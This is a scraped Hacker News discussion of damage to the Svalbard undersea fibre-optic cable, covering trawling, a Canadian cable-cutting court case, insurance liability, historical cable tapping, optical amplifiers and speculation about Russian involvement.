understand a refrigerator the same way you would need to really understand 5G etc, you would need to know the actual pressures involved etc. People don’t know the chemical properties and makeup of the refrigerant. What’s the acceptable impurity levels. What lubricants are in use, etc. The physical geometry of all the mechanical parts and so forth. reply Jerrrrry 12 hours agorootparentprevAll conspiracies are based in reality. All of them. reply gjs4786 16 hours agorootparentprevAhhh, pseudoscience. A refreshing cup of shit, isn't it? reply Galatians4_16 14 hours agorootparentprevTrust, but verify. reply Tor3 15 hours agorootparentprev\"Maybe a clue about the real origin of the photos\". No. It's simply the _commercial product_ the police used for markers. It shows both cm and inches. You don't think that the police themselves are actually manufacturing these things, do you? reply Aurornis 20 hours agorootparentprevThe photo with evidence marker 11 clearly shows both inches and centimeters. There's no conspiracy here. They're just taking photos with both sets of measurements. reply Kon-Peki 14 hours agorootparentHey, I apologize. Only two photos loaded on my phone, both of which used inches only. Conspiracy was the furthest thing from my mind; I’ve seen photos from police in the US with centimeters and I thought it was hilarious: Americans using cm and Europeans using inches. What’s the world coming to? reply nkrisc 16 hours agorootparentprevHave you considered more mundane explanations first? If there was a conspiracy I think they would not have made such a foolish and obvious error. reply eru 14 hours agorootparent> Have you considered more mundane explanations first? It's indeed more likely the police just bought an off-the-shelf measuring device. They often come with both imperial and proper units. > If there was a conspiracy I think they would not have made such a foolish and obvious error. Alas, that's not necessarily a good rule-of-thumb. Incompetence is a thing. Compare to eg how the Russian spooks placed three copies of the game SIMS 3 in the pictures they published of an alleged assassins' lair. (Most likely, some superior officer told the grunts to put three SIM cards for burner phones in the picture.) See https://www.vice.com/en/article/88gpmg/russia-sims-3 reply dasv 11 hours agorootparentIn addition to that, this photo was taken onboard a cable laying vessel. There are not that many and they are booked back to back all over the world, so it is not of the question that they would have dual metric and imperial measurement devices. Also, onboard a working ship there is usually an international mixture of crew and contractors, and of course they might have American clients. reply somenameforme 13 hours agorootparentprevThat isn't 3 copies of the Sims 3. It's one copy of the game and two different expansion packs - Outdoor Living and Master Suite it looks like. This is a pretty important detail, because it's pretty difficult to come up with a reasonably likely explanation for why somebody would have 3 copies of a single game, but trivial to do so for game + expansions, which was then mistaken by an officer on the scene for being meaningful. Ah but how the media has such different standards for conspiracy theories when it furthers a desired narrative, rather than contradicts it. reply eru 13 hours agorootparentThanks for correcting my memory about three copies of the Sims 3. > [...], which was then mistaken by an officer on the scene for being meaningful. Well, my narrative here is that one way or another the officers were incompetent. Either in staging (more likely), or in assigning meaning (less likely). reply ChrisClark 19 hours agorootparentprevNope, there aren't as many actual conspiracies as you think there are. reply threeseed 20 hours agoparentprevThe bottom image has an evidence marker with cms on it as well. Perhaps they intended for the information to be shared with US intelligence. reply tailspin2019 17 hours agoprevI’m probably being really slow but I couldn’t really work out what the pictures are actually showing. I see a bunch of yellow cables and some with steel sheathing - I’m not really sure what I’m looking at? Are all those cables laid together or are these photos of just one actual cable that has been fully pulled up and coiled? reply db48x 16 hours agoparentYes, that must be the coil of cable after they had started pulling it off of the seabed. The steel armoring is supposed to be a bunch of steel wires tightly wound around the cable, to protect it from damage. reply Scoundreller 22 hours agoprevHad a case in Canada where a fisherman ignored the maps and kept picking up a fibre optic line with their fishing gear, and eventually cut it with a saw (twice): (I suspect it was a short-haul line, so carried no electricity for amplifiers) https://www.canlii.org/en/ca/fct/doc/2011/2011fc494/2011fc49... https://en.wikipedia.org/wiki/Peracomo_Inc_v_TELUS_Communica... > In 2005, however, he managed to pull up the Sunoque I. He did not know what it was but managed to free his anchor > The next year, he again hooked an anchor on the Sunoque I. This time he was able to haul it out of the water and secure it on deck. He made no effort to free it. He deliberately cut the cable in two with an electric saw. A few days later the same thing happened. This time it was much easier to haul the cable out, and he cut it again. > Some weeks later, after the fishing season, while on the dock at Baie-Comeau he noticed a strange looking ship in the area where he usually fished. Later, he saw a photo of the ship in the local newspaper. The accompanying article stated that the cable had been deliberately cut and a search was on for the culprit. reply mk_stjames 43 minutes agoparentThe idea of being way out on the open water, and pulling up your anchor and finding that it is bringing up some giant steel-wrapped black cable up out into view as you look over the edge of your boat, going off in either direction downward into the seemingly infinite deep water... brings up some crazy weird primal fear [1] in me. I wouldn't even want to touch it, let alone haul the cable onboard and cut it. I'd cut loose the anchor chain and hope to see the thing again. [1] https://en.wikipedia.org/wiki/Thalassophobia reply resolutebat 21 hours agoparentprevTL;DR of the court cases: the fisherman was guilty of damages to the tune of $1.2M, and his insurance cover was voided because his act was so reckless. Funnily enough, the cable owners (Telus) tried to thread the needle of making the owner liable, but not so badly that insurance wouldn't pay for it. The judge didn't buy this, and obviously a sole operator crab boat can't pay over a million in damages (although he did lose his boat), so in the end everybody except the insurance company got screwed. reply charles_f 12 hours agorootparentMakes you wonder if those cables should (can) be insured against such problems instead of relying on a craber's insurance. reply refurb 17 hours agorootparentprevDespite not recovering any money, Telus may have seen some value in letting others know what the consequences can be. “Kill the chicken to scare the monkey reply Scoundreller 15 hours agorootparentI think they taught the value in letting others know to NOT put things together yourself that you cut an operational cable and report it to police yourself voluntarily. reply ikekkdcjkfke 9 hours agorootparentprevNot even a down payment on the fine? reply resolutebat 8 hours agorootparentThere were no criminal penalties, this was a civil case. reply cma 20 hours agorootparentprevSeems like the insurance would still pay but he loses his boat to the insurance company at that point, assuming carrying insurance was part of his fishing license. reply lazide 18 hours agorootparentDue to problems with moral hazard, insurance generally doesn’t cover anything illegal done intentionally or due to extreme (willful) recklessness/negligence. Hard to argue that wasn’t what the fisherman was doing at the point he was sawing a cable in half using a saw he’s already dredged up several times. reply EnigmaFlare 10 hours agorootparentHe apparently didn't realize that it was important: \"is in his 60s, has fished since he was 15. The courts were told that he had no formal training but picked his fishing grounds by experience\" \"he saw a chart showing a line running through his fishing area with the handwritten notation “abandonne.” He concluded his underwater nemesis was fair game and when he snagged it again in June of 2006, he pulled it up and sliced through it with an electric saw.\" \"Vallee heard that police were looking for the culprit. He came forward and made a voluntary statement.\" reply iSnow 4 hours agorootparentPoor guy. He might be an idiot for just slicing some cable he dredged up, but possibly had neither the education nor the knowledge to understand what he was doing. reply lazide 3 hours agorootparentThe willful negligence is not asking someone or saying something before slicing into an expensive looking underwater cable with a saw - which would take some time, preparation, and persistence. And if it was actually abandoned, what was cutting it going to do for him anyway? Unless he removed the cable, he was going to keep snagging it in different areas. This isn’t like cutting a corner pulling out of a parking lot and running over some flowers. This is like digging with a backhoe in front of your business to install some irrigation, and getting irritated at all those pesky cables and stuff underground. And rather than talking to someone about it, ripping them all out because ‘it didn’t look like anyone was using them’. reply tgsovlerkhgsel 10 hours agorootparentprevMandatory insurances (that are mandatory to ensure victims get paid) are often required to pay even in such cases, but are then allowed to (try to) get the money back from the perpetrator. This protects the victim but not the perpetrator, eliminating the moral hazard. reply charles_f 12 hours agorootparentprevMakes me wonder if car liability insurance covers the damages you can cause if you drive recklessly or even purposely hit someone's car reply consp 9 hours agorootparentThey do, they'll just come after you for the money and will not cover your costs since you acted reckless. Where I live this is the minimum you MUST insure yourself for and they pay out no matter what (to the other party). If you acted in bad faith they will come for your money. If it's an accident or out of your control they pay the damages you caused for you and you are fine. Since everyone is insured by law what usually happens is the companies involved all pay out and then afterwards figure out among themselves if and from whom they can collect. reply Scoundreller 3 hours agorootparentSimilar here: auto insurers lobbied to exclude coverage for damage to your vehicle if you were under the influence or alcohol or drugs. I guess people may ethically agree to that but did premiums go down? Of course not. A very profitable move for the insurance companies to provide less insurance without handing over the savings. And it even applies to “anyone you let drive your vehicle” so everyone is supposed to be a drug recognition expert, which is even controversial amongst those that are supposed to be the “experts”. reply littlestymaar 9 hours agorootparentprevThe “moral hazard” argument is completely bullshit as usual, there's no moral hazard if there's consequences besides the damage, and it's always the case when doing something illegal (there's a fine, or jail time for instance). But insurances' business is about finding reasons not to pay, so it's not surprising at all… reply lazide 3 hours agorootparentImagine a scenario - a restaurant owner is insured for $3 million dollars for the business and structure (not atypical). Business isn’t doing great. The place catches on fire and burns down. All the business assets and the structure are lost, so the business needs to shut down. If arson wasn’t an exclusion; 1) why would anyone look closer to figure out if it was intentional or not? Assuming no one was injured. Who has the incentive to do all the investigation? 2) even if they got caught and convicted, in California the jail penalty is only 3 years for structure arson. $3mln is a hell of a payday for three years in jail, and without the exclusion, they’d still be entitled to the payout. 3) what if they had a buddy do it, and the evidence they conspired wasn’t strong enough to get a criminal conviction - but enough for civil court. Or civil discovery would uncover evidence, where a criminal investigation may not. Same dynamic plays out for life insurance, vehicle, personal liability, home insurance, etc. Moral hazard is a real issue for any insurance, as knowledge that a payout can come due to a circumstance someone can intentionally trigger definitely changes the odds of those circumstances occurring. In some cases to the point of strongly encouraging or even outright warping the market so those circumstances occur regularly. Without insurance, the owner is the one who bears the costs directly no matter what, so we’d likely have a lot fewer buildings burning down! People would in general be a lot more careful, just like they’d be more careful driving if every car has a giant knife embedded in the center of the steering wheel instead of having airbags. A lot more lives would be ruined though when being careful isn’t enough eh? Or people get overwhelmed. And of course insurance companies have a strong incentive to not pay out illegitimate claims. They’d go bankrupt if they did anything else! Sometimes (or often, depending on your POV) they try to not pay out legitimate claims, which is why documentation and legal representation is important too - and why it’s such a heavily regulated industry pretty much everywhere. reply littlestymaar 2 hours agorootparentI don't understand your example because from your description I can't tell who set the place ablaze. If it's the owner, then it's insurance fraud, and it has nothing to do with moral hazard. If it's not the owner but say a random crackhead, then I also fail to see how it qualifies as moral hazard, and if the insurance doesn't not cover them nobody will (because the arsonist is insolvent and will never be able to pay $3M) and the business owner is screwed, which is a terrible outcome (and is exactly what happened here). In any case the answer to 1) clearly is “the insurance company” exactly as if arson is excluded. > Without insurance, the owner is the one who bears the costs directly no matter what, Which is exactly what he's trying to avoid when paying for an insurance in the first place. And like with health insurance, there's actually very little link between the fact that you're insured or not and the risk you're taking (Like nobody gets hurt because their injuries get reimbursed) because the harm goes far beyond the economic loss you're insuring yourself against. reply sschueller 2 hours agoprev\"anchor or a trawl is dragged across it\" At this point this seems to be the most common cause of see cable damage. I guess the captains decide that it's worth dumping the anchor in a storm to protect the cargo even if the area \"forbids\" it. reply anonymousiam 21 hours agoprevHistorically, there's been a lot of mischief with the cables. https://asiatimes.com/2023/04/new-us-spy-sub-built-for-seabe... reply mschuster91 21 hours agoprevLet's assume that these incidents actually were accidents, there's still a bigger question open: why is trawler fishing still allowed? Imagine it's not a fiber cable that ends up being crushed by a trawl door... but all the other marine life: Fish can swim away (or not, being the point of getting fished), but plants, corals, bugs? Trawler fishing is devastating for the local ecology, we just don't see the damage - to quote [1], page 16: > Seabed habitats are under significant pressure across European seas from the cumulative impacts of demersal fishing, coastal developments and other activities. Preliminary results from a study presented in SWD(2020) indicate that about 43% of Europe’s shelf/slope area and 79% of the coastal seabed is considered to be physically disturbed, which is mainly caused by bottom trawling. A quarter of the EU’s coastal area has probably lost its seabed habitats. Honestly I'm pretty much in favor of banning trawler fishing and the import of trawler-fished fish into the European Union, even if it's just to protect our fiber links. [1] https://commission.europa.eu/document/download/720778d4-bb17... reply steve_adams_86 21 hours agoparentI agree. The more you learn about trawling the less you’ll understand why it’s still permitted in so many places. Where I live it’s cut back dramatically, but the bizarre thing is that it’s strictly permitted in territories where we know rare deep sea glass sponge reefs exist, and once thrived. These reefs are islands of immense diversity and biomass which fed huge numbers of transient species moving through the deep. They were also nurseries for a large number of fish species we commonly fish for. We work so hard to regulate our fisheries yet do so little to properly protect the resources they extract from a holistic perspective. reply mschuster91 20 hours agorootparent> We work so hard to regulate our fisheries yet do so little to properly protect the resources they extract from a holistic perspective. Our fish industry is really well connected politically and the large players exactly know how to play the fiddle, and any attempt to hold the foreign ones accountable with actually working and appropriate measures (it's highly likely that it will take live ammunition or an intentional collision, at least in legally \"open\" seas) would likely result in WW3. reply BostonFern 17 hours agorootparentTo add to that, the extent of slavery taking place on fishing vessels operating in international waters is enormous. The laws to board and free captive slaves have been in the books going back to the 1800s in the case of Britain, yet nothing is done about it globally. The media and researchers who detail it are hesitant to even use the term “slavery”. reply throwaway290 13 hours agorootparentOutlaw ocean episode: https://music.amazon.ca/podcasts/9d669553-a9ee-4cf2-96fd-311... reply staplers 17 hours agorootparentprevthe less you’ll understand why it’s still permitted in so many places. Financial \"incentives\" from fishing industry and political ramifications of raising food prices (seafood is a large portion in some places). It's absolutely an existential threat to the ecology of the entire Earth yet those are the reasons why. \"Close to 90% of the world’s marine fish stocks are fully exploited, overexploited or depleted.\" Source: https://www.unep.org/facts-about-nature-crisis reply azalemeth 20 hours agoparentprevFishing as carried out industrially is terrible for the environment as a whole, and really often also exploits those employed in it. The huge army of Asian fishing fleets that skirt the law and the ethics of both sides of this are the worst of the worst, however, and deep sea trawling is particularly awful. Then again, farmed fish isn't exactly ecologically brilliant either... reply BostonFern 16 hours agorootparentThey do more than skirt laws and ethics. A large amount of fishing vessels operating in several regions around the world practice outright slavery. Working-age men are lured into debt-bonding to work at sea indefinitely for no wages up to 20 hours per day with little to no food until they succumb to exhaustion, injury, or disease, or if they show signs of resistance, are executed as an example to the other enslaved men. When someone dies, their remains are thrown overboard. Most accounts of this have only surfaced because people have bought the freedom of some of these men, who are seen as nothing but a labor resource, bought and paid for usually directly by the captain, in order to catch otherwise mostly unprofitable fish. If an industry is prepared to engage in slavery, playing fast and loose with international borders and environmental regulations is of course not a concern to that industry. reply Grimburger 14 hours agoparentprevComplete agree. The hidden damage we are doing to marine ecosystems is horrendous. I love eating seafood but have basically given it all up due to environmental concerns, there's very few fisheries left that are harvested sustainably and farmed fish as an alternative cause a host of other problems for marine wildlife in the area. Even the sustainable types of fish usually end up with huge amounts of bycatch that it's hard to justify eating them too. At this point the only seafood I can eat is something I've caught myself and isn't of concern for sustainability, Australia is lucky in that respect with quite a few species thriving but we still face a lot of illegal fishing in our waters that's incredibly hard to police. reply toomuchtodo 20 hours agoparentprevhttps://en.wikipedia.org/wiki/Anti-trawling_device https://news.mongabay.com/2023/07/mud-muck-and-death-cambodi... https://www.dailymail.co.uk/sciencetech/article-8823369/Gree... https://www.huckmag.com/article/paolo-fanciulli-the-italian-... reply 0xedd 11 hours agoparentprevCool. Will you pay the cost difference afterwards? I kinda don't like the taste of bugs. reply the_gipsy 11 hours agorootparentAllright, let's not do anything, ever. reply timeon 3 hours agorootparentprevCool. How about you paying cost of the wildlife? reply mortb 6 hours agoprevWhat kind of international law can we expect in the future? A law that is constantly broken by various maleficent actors? Of course we've heard them complain that the current order is run by the west and harmful to others. What are the alternatives? A hundred cables? reply ThalesX 2 hours agoparent> According to Johnson the US has never endorsed the ICC because it's a \"direct affront to our own sovereignty. [...] We don't put any international body above American sovereignty and Israel doesn't do that either,\" he added. God I have developed such a distaste for political opinions. Everyone thinks they're right and everyone sees the various maleficent actors in others. [0] https://www.jpost.com/international/article-802290 reply bell-cot 2 hours agoparentprev\"constantly broken by various maleficent actors\" is a pretty good description of the past of international law. There is no reason to expect the future to be any different. reply jorisboris 15 hours agoprevWe once booked a night on Rebak Island, next to Langkawi, Malaysia. The day before our arrival I receive a call that a boat somehow broke the water pipe which lies on the bottom between Rebak and Langkawi, cutting the island off from fresh water, and whether I wanted to rebook to another hotel. Not sure what the moral of the story is, but it kinda fitted the context :) reply adolph 21 hours agoprevThis reminds me of a story in \"Blind Man's Bluff,\" summary: [Capt James F. Bradley Jr.] was at his office in Naval Intelligence one day at 3 a.m. when the St. Louis native began reflecting on his boyhood life on the Mississippi River. As he later told the authors, he recalled that the river beach was dotted with signs warning, “Cable Crossing — Do Not Anchor,” so a boater would not foul the cable. At that point, he wondered if the Soviets did not have similar signs along their Arctic coasts to prevent their critical cables, including those used by the KGB and the Soviet Northern Fleet, from being damaged. As a result of these ponderings, in 1971 the American submarine Halibut, with its periscope up, slowly and secretly traced the Siberian coast looking for telltale warning signs. The cable signs were found, and American divers put a tap at the bottom of the Sea of Okhotsk on Soviet communications. https://stationhypo.com/2021/09/05/remembering-captain-james... reply fbdab103 21 hours agoparentIs it possible to tap fiber-optic cables without the owner getting wise? Even if you could tap modern cables, I assume everything is now encrypted and carries so much bandwidth that it becomes possible to sample the interesting intelligence. reply dekhn 18 hours agorootparentIt certainly has been the case in the past (when undersea fiber operators were much less careful) that cables have been tapped without the owner getting wise. IIUC the method used in the past was to bring the cable inside a submarine which has a specialized fiber cleaving and joining machine. Some amount of full transmission loss already occurs, so to the operator is just looks like blip. Here's a description of an early operation (which I think was actually on copper cables): https://en.wikipedia.org/wiki/Operation_Ivy_Bells When I worked at Google, Snowden and others showed that it was likely the US NSA was spying on Google fiber outside of US, I believe the speculation was that they tapped lines around UK, possibly underwater. There's nothing quite like seeing a packet trace containing an RPC between a frontend and backend and being able to recognize the communicating services, collected by a third party. Google greatly sped up its RPC encryption project after that revelation. reply ascorbic 6 hours agorootparentGoogle's Grace Hopper cable lands right next to GCHQ Bude, which has an NSA listening station. They don't even need to be subtle about it. reply dooglius 20 hours agorootparentprevNormal fiber optic can be tapped surreptitiously[0]. There are a number of companies that sell anti-intrusion tech, but it's hard to say which side is winning with respect to what governments can do. [0] https://fac.ksu.edu.sa/sites/default/files/06149809-Optical_... reply gravescale 19 hours agorootparentprevThis is one of those ones where my instinct is \"no\": not only would you have to not cause an interruption or reflection that the break detection TDR systems could see, and crack any encryption, and sample what you want from the Tbps, all from a small box under the sea, but also you have to somehow get that data out and back to base, again from under the (mostly radio-opaque) sea and halfway around the world, all without even a whisper of a clue to the tappees. Then I remember how far ahead the likes of the NSA and NRO are compared to what we're familiar with, and become rather less sure. The Orion satellites have 100m radio dishes, and were first launched in the 90s. Two Hubble-like telescopes were so old hat that they were donated to NASA in 2012. Considering that the NRO is so secrecy-oriented that its very existence was classified until 1992 (it went 11 years completely undetected, and leaked via a New York Times article in 1971 and an accidental entry in a budget report in 1973) and no mission since 1972 is declassified, this says a lot about how much further on they are. Then again, if unattended taps were installed on cables, you'd also expect them to occasionally be found when lifting cables for repair. And they'd be so advanced that it might be worth lifting an entire cable to check for and acquire such a tap. Which means the tappers would think twice about putting one in, if they could then lose it. reply bigiain 18 hours agorootparent> if unattended taps were installed on cables, you'd also expect them to occasionally be found when lifting cables for repairAn advanced enough attacker would build their cable taps in such a way that they automatically dropped off when they detected the cable being lifted - and would probably result in suspected but not provable \"damage caused by human activity\" that has broken through the cable armouring and exposed the fibre bundle inside. Now I'm wondering if the Svalbard cable damage was a software bug in the cable tap device. reply fragmede 19 hours agorootparentpreveven the metadata would be valuable though, so you wouldn't need to crack the encryption, and you don't have to have it be real-time, so you can just process and save the relevant data and pick it up later, so my instinct is that it's possible there's something there, but it would be really difficult, and we might hear about it in 50 years, just like we learned about Bletchley Park. reply lobochrome 19 hours agorootparentprevJust tap a repeater and deal with encryption later. reply bigiain 18 hours agorootparentAs I understand it (being nothing more than a Google expert on the subject), the repeaters aren't the sort of thing you can just \"tap\". They don't decode and re encode any data, they don't even \"see\" the raw encrypted data as such, they're just specially doped sections of fibre with pump lasers that amplify the optical signals. The \"Get pumped\" section of this page has an almost ELI5 overview: https://hackaday.com/2023/08/08/under-the-sea-optical-repeat... reply 0xedd 10 hours agorootparentprevPrivate companies provide equipment and software to analyse all raw data going through an ISP. All the big names, from US and EU to some countries in Asia, bought this equipment and software. So, my guess is that a government's budget can enable sampling anything from \"so much bandwidth\". Regarding encryption, if you run the numbers, to brute force common encryption algorithms it would take Google's compute 1 second. Image all Google service have an outage for 1 second. Google is just an example to imagine the sizing required. In other words, technically possible. And shouldn't be dismissed with \"oh, there is encryption, so that door is closed for any threat actor\". > Source: I worked on said analytical software. reply heavenlyblue 7 hours agorootparent> if you run the numbers, to brute force common encryption algorithms it would take Google's compute 1 second That's not true at all. reply swader999 21 hours agoprevThis has sea monster written all over it. reply mcswell 17 hours agoparentAlien sea monsters! reply Waterluvian 22 hours agoprev> The current is used to amplify the fibre optic signals that flow through the 1300km long cables between the peninsula and the Norwegian mainland. This is magic to me. Anyone have a search term I could use to better understand how electricity is used to boost a fibre optic signal? reply henrikeh 22 hours agoparentI don’t know about this cable specifically, but it can be done by transferring more power to the optical signal. Erbium-doped fiber amplifiers work by utilizing a nonlinear optical effect where energy is transferred from a pump laser to the signal. This is in principle possible in any optical (glass) fiber, but by doping with exotic elements, the amplification characteristics can be optimized. Erbium is suitable for the conventional communication wavelengths. For reference I have a PhD in information theory and signal processing for fiber channels. reply kaliszad 21 hours agorootparentThis is still a good practical reference I like to point out, when people ask: https://www.youtube.com/watch?v=mWqe8_5SUvk Richard A. Steenbergen has also other good talks, e.g. on traceroute. There are multiple versions of these talks that include more or less the same stuff with occasionally more information here and there. reply pseudosavant 22 hours agorootparentprevComments like this are why I love HN! reply darkclouds 21 hours agorootparentprevhttps://en.wikipedia.org/wiki/Optical_amplifier#Doped_fiber_... The crush to the cable could be a number of things but without knowing the terrain, and knowing these cables just lie on the sea floor, it could be caused by the cable sitting on some jagged rock and has been pulled tight elsewhere (perhaps by fisherman dredging the seabed) resulting in the cable being forced onto the jagged rock and it being crushed onto the rock. Likewise, but unlikely, some heavy object from above has some how landed on the cable, perhaps even a submarine of sorts resting on the seabed. Again knowledge of the terrain of the sea floor where the cable crush took place is key into gaining some idea of what might have happened, but I think its the first scenario, a fisherman dredging the sea floor elsewhere has caught and pulled the cable tight and the cable crush is the damage from it resting on rocks where its snagged and crushed itself from the tautness. Rock climbers and abseilers using ropes will see this with their ropes. reply dekhn 22 hours agoparentprevIt's a optic to electronic device that is embedded in the cable, which is powered by electricity (but I think the tech was improved, see my last link). It's mentioned here: https://en.wikipedia.org/wiki/Submarine_communications_cable... with more detail here https://hackaday.com/2023/08/08/under-the-sea-optical-repeat... and pictures here: https://hackaday.com/2023/08/08/under-the-sea-optical-repeat... (IIUC those are inside of the ship laying or repairing the fiber,a nd they normally live on the ocean floor) and tons of photos of the process of laying cable: https://www.businessinsider.com/google-facebook-giant-unders... However I think there are also fully passive repeaters- https://en.wikipedia.org/wiki/Optical_amplifier reply orlp 22 hours agoparentprevThe optical signal repeaters that are part of the cable every N kilometers need power to do their job. reply Waterluvian 22 hours agorootparentOhh there’s physical electronic repeaters. Okay. I thought this was some sort of electromagnetism witchcraft. reply cyberax 21 hours agorootparentThey actually are witchcraft. They amplify the signal directly, without transforming it into electrical signal. reply bee_rider 22 hours agorootparentprevIt’s all witchcraft anyway. I’m not sure what they use exactly, but even photodiodes are pure witchcraft. reply nbernard 22 hours agorootparentprevThere is still some witchcraft. Look up \"optical pumping amplifier\" for instance. reply cricalix 22 hours agoparentprev\"Fiber optic amplifier undersea\" should do the trick. It's not that the power supply wrapped around/alongside the fiber does anything directly; it's being delivered to amplifiers. There's a hackaday article that's got some history in it. reply jamesblonde 22 hours agoprevTLDR; it probably wasn't the russians, most likely a trawler. reply lijok 22 hours agoparentIf by \"the russians\" you mean russian defence, I can guarantee they would use something as inconspicuous as a trawler for the job rather than a combat vehicle reply trhway 21 hours agorootparentFor the curious - google “tanker Minerva Julie Nord Stream”. While officially the tanker is Greek, it is tightly connected to Russia. I’d be looking for the key places in international waters and the likes needed to be cut simultaneously to say paralyze Europe banking and other infrastructure and would be checking whether there are Russian (and affiliated like that Minerva company) “trawlers” with a habit of hanging around those places. reply dagss 22 hours agoparentprevThis article details how certain russian trawlers criss-crossed a lot over another cable in Norway that broke some time before... ...and then the same trawlers were in the vicinity of this cable in Svalbard when another trawler criss-crossed over it until it broke (In Norwegian but hopefully Google Translate will do an OK job and mainly graphics) https://www.nrk.no/nordland/xl/russiske-tralere-krysset-kabl... reply holoduke 22 hours agorootparentCriss crossing is quite normal behavior btw. I see it all the time here at the North Sea near England. reply glitchcrab 22 hours agorootparentSure, but that also makes it an ideal cover story too. reply staplers 17 hours agorootparentWhy would the russians care to have a cover story? They're in an open hot war with the west. reply sgt 12 hours agorootparentBecause they still want to keep a good relationship with Norway. There's trade and collaboration on fish. Russian fishing and transport vessels are using 3 major harbors in Norway. reply dagss 7 hours agorootparentprevIf there was an open hot war, would US congress debate for months whether to approve the military package to Ukraine? reply everyone 2 hours agorootparentMaybe, the USA's governance system seems to be malfunctioning. The 6 month gap in supply to Ukraine has made all of the USA's defense partners around the world, (eg. asia pacific) go \"what the fuck!?! The USA doesnt actually honor it's defence pacts!?\" reply rasz 8 hours agorootparentprevBecause West is week and easily manipulated. Its just a travler guys lol, we are just testing our radio transmitter in Królewiec lol, oh we didnt know those buoys were yours Estonia oops. Shoot someone in broad daylight and there is no doubt you did it, take off military insignia before sending little green men and paid off morons in the West will call it a separatists revolution. russia wont openly invade Baltics/NATO, they will send little green men under the cover of some self manufactured crisis. A big forest fire, chemical spill, maybe an aircraft crash or terrorist attack. Then it will be \"touch our guys and we Nuke you\" like they keep saying in Ukraine, with West trembling to cross magical imaginary red lines. reply trompetenaccoun 16 hours agorootparentprevhttps://www.nytimes.com/2024/05/26/us/politics/russia-sabota... It's an open war with Ukraine only so far. And many are not aware of the wider geopolitics of it, they don't know their countries are at war with Russia. Open attacks would scare many of those people and make them more hostile towards the Russian side. As it stands many are more neutral and Putin even has a significant number of fans in the West. reply austhrow743 17 hours agorootparentprevThey weren't at the time. reply rasz 8 hours agorootparentprevDoes taking corrections to better land over the cable look normal https://x.com/PerErikSchulze/status/1794828268480438514 ? reply cess11 22 hours agoparentprev\"NRK has previously reported how a Russian trawler crossed the Svalbad cable more than 140 times, and more than a dozen times before the damage occurred in January 2022. The shipowners have denied having anything to do with the damage.\" The norwegians seem to think it was a russian trawler and that trawler doesn't exclude the possiblity that russians did it. reply wkat4242 22 hours agorootparentYeah the Russians also used \"trawlers\" to hide their recovery operations of KAL007 to hide their mass murder. Trawler does not mean unintentional or not state related. reply berkes 22 hours agorootparentWow, the Russians shot down another plane. I never heard of KAL007 and thought MH17 was the first time this happened. Did any other nation states ever shoot down passenger airplanes? reply arprocter 22 hours agorootparentFull list: https://en.wikipedia.org/wiki/List_of_airliner_shootdown_inc... reply dboreham 21 hours agorootparentprevFor completeness: the US navy shot down an Iranian airliner. reply astro-throw 21 hours agorootparentThe \"full list\" posted earlier has that one on it. reply wkat4242 14 hours agorootparentprevAnd Iran shot down a Ukrainian plane. But yeah it's not unique. In this case it's really tough though because the Soviets knew it was a civilian airliner running with full lights. reply yborg 22 hours agorootparentprevUkraine International Airlines Flight 752 Siberia Airlines Flight 1812 reply stanislavb 22 hours agoparentprevA trawler driven by the Russians? reply Rebelgecko 21 hours agoparentprevDoes the Russian part of Svalbard depend on the cable for Internet? reply Waterluvian 22 hours agoparentprevThis was January 2022. Didn’t the alleged Russian interference happen later, during the invasion of Ukraine? reply defluct 22 hours agorootparentMaybe you're thinking about Nord Stream reply jhugo 21 hours agorootparentWhat would the Russian motivation be for blowing that up? They could have just turned off the gas supply. reply generj 18 hours agorootparentThe argument I remember goes something like this (and I could be remembering it wrong). They claimed technical problems prevented them from fulfilling the amount of gas required by their contract for NS1 and NS2. Due to sanctions they essentially had to provide gas for free - or at least in exchange for money they were unable to spend or access. The pipe blowing up potentially saved them from having to pay a penalty fee in the contract once the gas hadn’t been moving for X number of days. reply gjs4786 16 hours agorootparentWhy would Russia be concerned about a contract? Reminds me of a story on something like Unsolved Mysteries....lady had her husband killed because she was a christian, and thus, didn't believe in getting a divorce, and wanted to be with another man (his best friend.) And his friend went through with it... reply doublepg23 19 hours agorootparentprevWe'll have to wait 10+ years after this war ends before the talking heads admit it was clearly the USA govt. reply lamontcg 18 hours agorootparentThe Ukrainians are flying drones filled with explosives into Russian refineries and we still don't think it was just the Ukrainians taking out the Russian gas pipeline? reply austhrow743 16 hours agorootparentThat's a good reason to think it wasn't Ukraine not that it was. They're in open war with Russia, are openly attacking their resource infrastructure, and are frequently posting excellent high quality footage of it. Taking out the gas pipeline and then not using the attack for propaganda doesn't fit either their situation or their actions. reply lamontcg 13 hours agorootparentThe pipeline had the additional complication that it was supplying heating fuel to Europe. Bragging about it to the Germans would have probably been a bad idea. reply ajsnigrutin 18 hours agorootparentprevWe had to wait 60 years for declassified docs from the iranian coup... so yeah.. this'll take a long time. reply omnibrain 21 hours agorootparentprevThey left one pipe of NS2. It would have been a political victory for Putin with humiliation of the German government if they had switched to this instead of stopping gas imports via NS1&2 completely. reply luuurker 19 hours agorootparentprevI don't know who did it, but it helped to increase gas prices and Russia is a seller. reply bimguy 15 hours agoprevAh excellent, fishermen not only destroying the ocean but also the infrastructure of countries. When will peoples appetite for destroying the ocean be qualled? reply bjornasm 11 hours agoparentThere might be things that point towards this not being totally by accident. reply throwup238 19 hours agoprev> Initially, the police stated that they believed the damages were caused by human activity. Later on, the investigation was dropped, due to lack of evidence.... > Several experts with extensive experience with submarine cables and installations have assessed the images for NRK. Their judgement is that the damage to the Svalbard fiber was due to the cables being crushed. Finally evidence that Godzilla is real! reply debo_ 20 hours agoprev [–] Whoever named the time-traveling, world-saving X-Man from the future \"Cable\" was oddly prescient. https://en.m.wikipedia.org/wiki/Cable_(character) reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Exclusive photos show significant damage to the Svalbard fiber optic cable, likely caused by an external force such as an anchor or trawl, exposing the cable's copper layer to seawater and causing a ground fault.",
      "Despite initial police suspicions of human activity, the investigation was dropped due to lack of evidence, though underwater drone footage suggested trawler activity.",
      "The incident highlights the vulnerability of subsea cables, especially in remote areas, with fishing activities, particularly trawling, identified as the primary cause of most cable damages."
    ],
    "commentSummary": [
      "The damaged Svalbard cable, crucial for satellite data downlinks, impacts ESA, NASA, and commercial operators, including earth observation for Ukraine.",
      "Starlink offers limited backup but lacks the 10Gbps bandwidth of the fiber optic link, prompting discussions on satellite communication upgrades and geopolitical concerns, especially Russia's interest in Svalbard.",
      "The debate includes the high data capacity of the Svalbard Undersea Cable System, advancements in fiber optic technology, and the environmental impact of trawler fishing, with speculation on Russian sabotage and geopolitical tensions."
    ],
    "points": 508,
    "commentCount": 211,
    "retryCount": 0,
